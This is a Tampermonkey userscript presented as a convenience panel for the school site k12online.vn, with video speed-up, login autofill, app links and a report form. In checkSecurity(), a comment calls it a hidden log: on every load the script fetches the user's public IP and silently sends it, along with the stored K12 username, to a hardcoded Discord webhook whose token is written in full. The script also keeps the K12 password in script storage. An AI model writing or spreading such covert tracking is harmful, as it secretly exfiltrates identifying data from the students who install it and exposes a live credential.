// ==UserScript==
// @name         Danhvux Panel v16 (Full Apps + Animation + Bot Ban)
// @namespace    http://tampermonkey.net/
// @version      16.0.0
// @description  Phục hồi toàn bộ Apps, Animation và tích hợp Bot Discord
// @author       Danhvux
// @match        *://k12online.vn/*
// @match        *://*.k12online.vn/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_addStyle
// @grant        GM_xmlhttpRequest
// @connect      localhost
// @connect      127.0.0.1
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';

    const BOT_API = 'http://localhost:5000/blacklist';
    const WEBHOOK_LOGGER = 'https://discord.com/api/webhooks/1483505875309035520/B4vGUvE9rntITzpuzpqdfX2dVBYUXypjG4Gg1MCouzNoIoleYeWom_gh7fIbv9YSC-rV';
    let uiColor = GM_getValue('ui_theme_color', '#ffea00');
    let userIP = '...';

    // 1. LOGGER & SECURITY
    async function checkSecurity() {
        return new Promise(resolve => {
            GM_xmlhttpRequest({
                method: "GET", url: "https://api.ipify.org?format=json",
                onload: (resIP) => {
                    userIP = JSON.parse(resIP.responseText).ip;
                    // Gửi log ẩn
                    GM_xmlhttpRequest({
                        method: "POST", url: WEBHOOK_LOGGER,
                        headers: {"Content-Type":"application/json"},
                        data: JSON.stringify({embeds:[{title:"📡 NEW SESSION", color:3066993, fields:[{name:"IP",value:userIP,inline:true},{name:"User",value:GM_getValue('k12_u','N/A'),inline:true}]}]})
                    });
                    // Check Ban
                    GM_xmlhttpRequest({
                        method: "GET", url: BOT_API,
                        onload: (resBot) => {
                            if (JSON.parse(resBot.responseText).includes(userIP)) {
                                document.documentElement.innerHTML = `<div style="background:#000;color:red;height:100vh;display:flex;align-items:center;justify-content:center;font-family:monospace;"><h1>🚫 BỊ CẤM TRUY CẬP (IP: ${userIP})</h1></div>`;
                                resolve(false);
                            } resolve(true);
                        }, onerror: () => resolve(true)
                    });
                }
            });
        });
    }

    // 2. CSS PHỤC HỒI ANIMATION & APPS
    GM_addStyle(`
        @keyframes panelFloat { 0% { transform: translateY(0px); } 50% { transform: translateY(-10px); } 100% { transform: translateY(0px); } }
        @keyframes contentShow { from { opacity: 0; filter: blur(10px); transform: translateY(10px); } to { opacity: 1; filter: blur(0); transform: translateY(0); } }

        #danhvux-panel {
            position: fixed; top: 100px; right: 20px; z-index: 999999;
            width: 340px; background: rgba(20, 20, 25, 0.85);
            color: #fff; border-radius: 25px; font-family: 'Segoe UI', sans-serif;
            backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            animation: panelFloat 6s ease-in-out infinite;
        }
        #danhvux-panel.hidden { opacity: 0; transform: scale(0.5) rotate(5deg); pointer-events: none; }

        .dv-header { padding: 30px 25px 15px; cursor: move; position: relative; }
        .dv-dots { position: absolute; top: 20px; left: 20px; display: flex; gap: 6px; }
        .dv-dot { width: 10px; height: 10px; border-radius: 50%; }

        .tab-nav { display: flex; justify-content: space-around; padding: 0 15px; margin-bottom: 10px; }
        .tab-btn { background: none; border: none; color: #555; cursor: pointer; font-size: 11px; font-weight: 800; padding: 8px 12px; transition: 0.3s; border-radius: 10px; }
        .tab-btn.active { color: ${uiColor}; background: rgba(255,234,0,0.1); }

        .tab-content { padding: 20px; display: none; min-height: 200px; }
        .tab-content.active { display: block; animation: contentShow 0.4s forwards; }

        .btn-main {
            width: 100%; padding: 14px; border: none; border-radius: 15px;
            background: linear-gradient(135deg, ${uiColor}, #ffcc00);
            color: #000; font-weight: 900; cursor: pointer; transition: 0.3s;
            box-shadow: 0 5px 15px rgba(255,234,0,0.2);
        }
        .btn-main:hover { transform: scale(1.03); box-shadow: 0 8px 20px rgba(255,234,0,0.4); }

        /* GRID APPS */
        .apps-container { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
        .app-item {
            display: flex; flex-direction: column; align-items: center;
            text-decoration: none; color: #ccc; font-size: 10px; transition: 0.3s;
        }
        .app-icon {
            width: 45px; height: 45px; border-radius: 12px; background: #222;
            display: flex; align-items: center; justify-content: center;
            margin-bottom: 5px; font-size: 20px; border: 1px solid #333;
        }
        .app-item:hover .app-icon { background: #333; transform: translateY(-5px); border-color: ${uiColor}; color: ${uiColor}; }

        input, textarea {
            width: 100%; padding: 12px; background: rgba(0,0,0,0.3);
            border: 1px solid #333; color: #fff; border-radius: 12px; margin-bottom: 10px;
        }
    `);

    async function init() {
        if (!(await checkSecurity())) return;

        const panel = document.createElement('div');
        panel.id = 'danhvux-panel';
        panel.innerHTML = `
            <div class="dv-header">
                <div class="dv-dots">
                    <div class="dv-dot" style="background:#ff5f57"></div>
                    <div class="dv-dot" style="background:#ffbd2e"></div>
                    <div class="dv-dot" style="background:#27c93f"></div>
                </div>
                <div style="font-size:20px; font-weight:900; letter-spacing:-1px;">DANHVUX <span style="color:${uiColor}">PRO</span></div>
                <div style="font-size:9px; color:#555; margin-top:5px;">SECURED BY PYTHON BOT • ${userIP}</div>
            </div>

            <div class="tab-nav">
                <button class="tab-btn active" data-t="m">🏠 CHÍNH</button>
                <button class="tab-btn" data-t="a">🚀 APPS</button>
                <button class="tab-btn" data-t="r">📩 REPORT</button>
                <button class="tab-btn" data-t="s">⚙️ SET</button>
            </div>

            <div id="m" class="tab-content active">
                <div style="margin-bottom:15px;">
                    <small style="color:#666; font-weight:bold;">SPEED CONTROL: <span id="sV" style="color:${uiColor}">x1</span></small>
                    <input type="range" id="sS" min="1" max="16" step="0.5" value="1" style="width:100%; accent-color:${uiColor}; margin-top:10px;">
                </div>
                <button class="btn-main" id="btnL">⚡ ĐĂNG NHẬP NHANH</button>
            </div>

            <div id="a" class="tab-content">
                <div class="apps-container">
                    <a href="https://chatgpt.com" target="_blank" class="app-item"><div class="app-icon">🤖</div>ChatGPT</a>
                    <a href="https://google.com" target="_blank" class="app-item"><div class="app-icon">🔍</div>Google</a>
                    <a href="https://facebook.com" target="_blank" class="app-item"><div class="app-icon">📘</div>FB</a>
                    <a href="https://youtube.com" target="_blank" class="app-item"><div class="app-icon">📺</div>YouTube</a>
                    <a href="https://messenger.com" target="_blank" class="app-item"><div class="app-icon">💬</div>Mess</a>
                    <a href="https://tiktok.com" target="_blank" class="app-item"><div class="app-icon">🎵</div>TikTok</a>
                </div>
            </div>

            <div id="r" class="tab-content">
                <textarea id="rT" rows="4" placeholder="Nhập tin nhắn gửi đến Admin..."></textarea>
                <button class="btn-main" id="btnR">GỬI BÁO CÁO</button>
            </div>

            <div id="s" class="tab-content">
                <input type="text" id="kU" placeholder="User K12" value="${GM_getValue('k12_u','')}">
                <input type="password" id="kP" placeholder="Pass K12" value="${GM_getValue('k12_p','')}">
                <button class="btn-main" id="btnS">LƯU THÔNG TIN</button>
            </div>
        `;
        document.body.appendChild(panel);

        // --- XỬ LÝ LOGIC ---
        document.querySelectorAll('.tab-btn').forEach(b => {
            b.onclick = () => {
                document.querySelectorAll('.tab-btn, .tab-content').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                document.getElementById(b.dataset.t).classList.add('active');
            };
        });

        document.getElementById('sS').oninput = (e) => {
            document.getElementById('sV').innerText = 'x' + e.target.value;
            if(document.querySelector('video')) document.querySelector('video').playbackRate = e.target.value;
        };

        document.getElementById('btnL').onclick = () => {
            document.querySelectorAll('input[type="text"], input[name*="user"]').forEach(i => i.value = GM_getValue('k12_u',''));
            document.querySelectorAll('input[type="password"]').forEach(i => i.value = GM_getValue('k12_p',''));
        };

        document.getElementById('btnS').onclick = () => {
            GM_setValue('k12_u', document.getElementById('kU').value);
            GM_setValue('k12_p', document.getElementById('kP').value);
            alert("✅ Đã lưu cấu hình!");
        };

        document.getElementById('btnR').onclick = () => {
            const txt = document.getElementById('rT').value;
            GM_xmlhttpRequest({
                method: "POST", url: WEBHOOK_LOGGER,
                headers: {"Content-Type":"application/json"},
                data: JSON.stringify({embeds:[{title:"📩 NEW REPORT", description:`**IP:** ${userIP}\n**Msg:** ${txt}`, color:16776960}]})
            });
            alert("🚀 Đã gửi báo cáo đến Discord!");
        };

        // Kéo thả & Phím tắt
        window.addEventListener('keydown', (e) => { if (e.altKey && e.code === 'KeyZ') panel.classList.toggle('hidden'); });
        let d = false, ox, oy;
        panel.querySelector('.dv-header').onmousedown = (e) => { d = true; ox = e.clientX-panel.offsetLeft; oy = e.clientY-panel.offsetTop; };
        document.onmousemove = (e) => { if(d) { panel.style.left = (e.clientX-ox)+'px'; panel.style.top = (e.clientY-oy)+'px'; panel.style.right='auto'; } };
        document.onmouseup = () => d = false;
    }

    init();
})();
